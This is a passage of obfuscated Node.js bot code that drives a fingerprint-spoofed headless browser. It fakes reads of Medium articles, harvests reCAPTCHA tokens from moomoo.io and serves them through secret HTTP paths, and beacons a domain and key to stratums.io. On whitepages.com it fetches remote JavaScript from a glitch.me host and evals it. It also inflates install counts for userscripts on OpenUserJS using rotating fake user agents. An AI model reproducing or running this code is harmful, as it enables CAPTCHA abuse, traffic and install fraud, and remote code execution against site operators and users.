      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + V(0x13, '2Th*') + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + X(0x12) + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x4) + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + V(0x7, 'xq9Z') + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    W(0x3) + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + W(0x1) + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + V(0x0, 'WDzT') + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + W(0x2) + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + W(0xd) + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    X(0x10) + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0xdd2 + 0x1 * -0xd77 + -0x7 * 0xd
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x13ea * -0x1 + 0xf6 * -0x2 + 0x15d6)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1d * 0xe4 + -0x183c + 0x1 * 0x3274), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x59 * 0x44 + -0x1 * 0x2021 + -0x1 * -0x8e1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x8 * -0x2a7 + -0x1 * 0x229d + -0x37d5 * -0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0xa3 * -0x10 + -0x872 + -0x1be; w < getRandomInt(-0x7 * -0x461 + -0x2557 * 0x1 + -0x1 * -0x6b1, -0x1 * 0x1f7 + -0x1787 * -0x1 + -0x44f * 0x5); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x12b42 + 0x9787 * 0x3 + 0x7 * 0xb4b);
        }
      }();
    }, -0x1255 + 0x1e2a + -0xb71), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1 * -0x23e5 + 0x4 * -0x3d2 + 0x332d;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x22a2 + 0x437 + -0x26d9, -0x1 * 0x17ad + -0x36 * 0x15 + 0x1c4d)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x2c6b + -0x5 * 0x2c93 + 0x1807a);
    }, 0x1ba3 + 0x5fb * -0x1 + -0x1544), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0xb1 * -0x32 + 0x1010 + -0x32a2;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1ffa * 0x1 + 0x52 * -0x2a + -0x86 * 0xd), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x2550 + 0xea7 + -0x33f7), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x1a5625 + -0x10f74b * -0x1 + -0x1d91d0);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x5 * -0x7 + 0x1f34 + -0x1ead);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x10f + 0x2 * 0x251 + -0xb * 0x41);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x3aa1 + 0x1 * -0x23dd + 0x7e0e);
}

function a() {
  const bl = [
    'D8oIW6fbWOhdR8kvm8o8WRq',
    '.0\x20Safari/',
    'Win64;\x20x64',
    'Mozilla/5.',
    'pts/by-sit',
    'A28PienOCM9Tzq',
    'Dg1FC291CMnLpq',
    'WOrpkmoXWP/dSCopW7xcImo2',
    '-noeCjO416',
    'B25SB2fK',
    'wSOFdefX47',
    'WRddGmk+kmoDexnezmkZ',
    'lHxdVuZdNN9oo8ocxq',
    'itconnecte',
    'smobECosW7TioSo5W6VcRq',
    'cYtdO8kMnYlcTaneW7G',
    'Ahr0Chm6lY9Tzq',
    'xSoKW63cPW',
    'jujejufdBwfYAW',
    'mSkRrcu7z8kYWOO0oW',
    'qmoFgJrIWRJdU8ofrq',
    'rg/en/scri',
    'WPBdP8ksW6LLc3y',
    'tSo9W6rYCCkFkmosmCkz',
    'mmkVqXKXBCkTWOr0ia',
    'CMCVzw4VC2nYAq'
  ];
  a = function() {
    return bl;
  };
  return a();
}
doFlags['doOUJS'] && ((async () => {
  const a1 = c,
    a0 = b,
    Z = d;
  async function f() {
    const Y = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x3 * -0x1c5 + 0xf0 + -0x63e) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1 * 0xb05 + 0x955 * 0x4 + 0x1c * -0x1ba));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x427 * 0x2 + -0x1d * 0xaf + 0x1c21, D['indexOf']('\x20'));
        return B ? E['slice'](0x3d5 + 0x12 * -0x12f + -0x47 * -0x3f, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x4154 + -0x3663 + 0x1c1f),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x[Y(0x16, '0xLo')])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1 * -0x4b6f + -0x379d + 0x8f4 * 0x13),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': Y(0xc, '$4(c') + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + Z(0x2) + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + a0(0x17, 'h@V4') + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + a1(0x5) + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x5db * -0x1 + -0x75 * 0xd + 0x16; k < 0x863 * -0x2 + -0x1f9 * -0x3 + -0xb * -0xfd; k++)
    setTimeout(f, (0x140eb + 0x116ef + 0x23e * -0xa3) * k * getRandomInt(-0x1 * -0x1b4f + -0x1 * 0x149f + -0x6af, 0x10f3 + -0x26cc + -0x2 * -0xaee));
  setInterval(() => {
    f();
    for (let l = -0x13 * 0x14c + 0x2 * -0x132b + 0x3efa; l < 0x1 * -0x1dbd + -0x1cc9 + 0x3a8a; l++)
